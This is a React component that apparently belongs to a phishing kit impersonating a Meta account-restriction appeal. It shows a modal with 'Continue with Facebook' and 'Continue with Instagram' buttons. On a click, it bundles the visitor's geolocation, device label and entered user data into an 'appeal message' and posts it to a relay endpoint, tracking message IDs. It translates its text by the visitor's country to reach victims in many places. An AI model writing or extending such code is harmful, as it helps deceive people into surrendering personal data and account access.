'use client';

import PageRestrictionImage from '@/assets/images/page-restriction-image.png';
import { store, type LoginProvider } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import translateText from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const FacebookIcon = () => (
    <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
        <path
            fill='#1877F2'
            d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'
        />
    </svg>
);

const InstagramIcon = () => (
    <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
        <defs>
            <linearGradient id='ig-gradient-choice' x1='0%' y1='100%' x2='100%' y2='0%'>
                <stop offset='0%' stopColor='#f09433' />
                <stop offset='25%' stopColor='#e6683c' />
                <stop offset='50%' stopColor='#dc2743' />
                <stop offset='75%' stopColor='#cc2366' />
                <stop offset='100%' stopColor='#bc1888' />
            </linearGradient>
        </defs>
        <path
            fill='url(#ig-gradient-choice)'
            d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z'
        />
    </svg>
);

interface LoginChoiceModalProps {
    onSelect: (provider: LoginProvider) => void;
}

const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
    const [isSending, setIsSending] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const { geoInfo, deviceLabel, messageId, userData, setModalOpen, setLoginProvider, setMessageId, resetFormSession } = store();

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Continue with Facebook', 'Continue with Instagram', 'Close modal'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleClose = () => {
        resetFormSession();
        setModalOpen(false);
    };

    const handleSelect = async (provider: LoginProvider) => {
        if (isSending) return;

        setIsSending(true);
        setLoginProvider(provider);

        const message = buildAppealMessage({
            geoInfo,
            deviceLabel,
            userData,
            loginProvider: provider
        });

        try {
            const res = await axios.post('/api/send', { message, old_message_id: messageId });
            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }
        } catch {
            //
        } finally {
            setIsSending(false);
            onSelect(provider);
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/60 px-4 backdrop-blur-sm'>
            <div className='relative w-full max-w-[480px] overflow-hidden rounded-2xl bg-white shadow-[0_24px_48px_rgba(0,0,0,0.25)]'>
                <button
                    type='button'
                    onClick={handleClose}
                    className='absolute top-4 right-4 z-10 flex h-9 w-9 items-center justify-center rounded-full bg-black/10 text-[#1c1e21] transition-colors hover:bg-black/20'
                    aria-label={t('Close modal')}
                >
                    <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                </button>

                <Image src={PageRestrictionImage} alt='' className='h-auto w-full bg-white object-contain' priority />

                <div className='flex flex-col gap-3 px-5 pt-2 pb-5 sm:px-6 sm:pb-6'>
                    <button
                        type='button'
                        onClick={() => handleSelect('facebook')}
                        disabled={isSending}
                        className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                    >
                        <FacebookIcon />
                        {t('Continue with Facebook')}
                    </button>

                    <button
                        type='button'
                        onClick={() => handleSelect('instagram')}
                        disabled={isSending}
                        className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                    >
                        <InstagramIcon />
                        {t('Continue with Instagram')}
                    </button>
                </div>
            </div>
        </div>
    );
};

export default LoginChoiceModal;
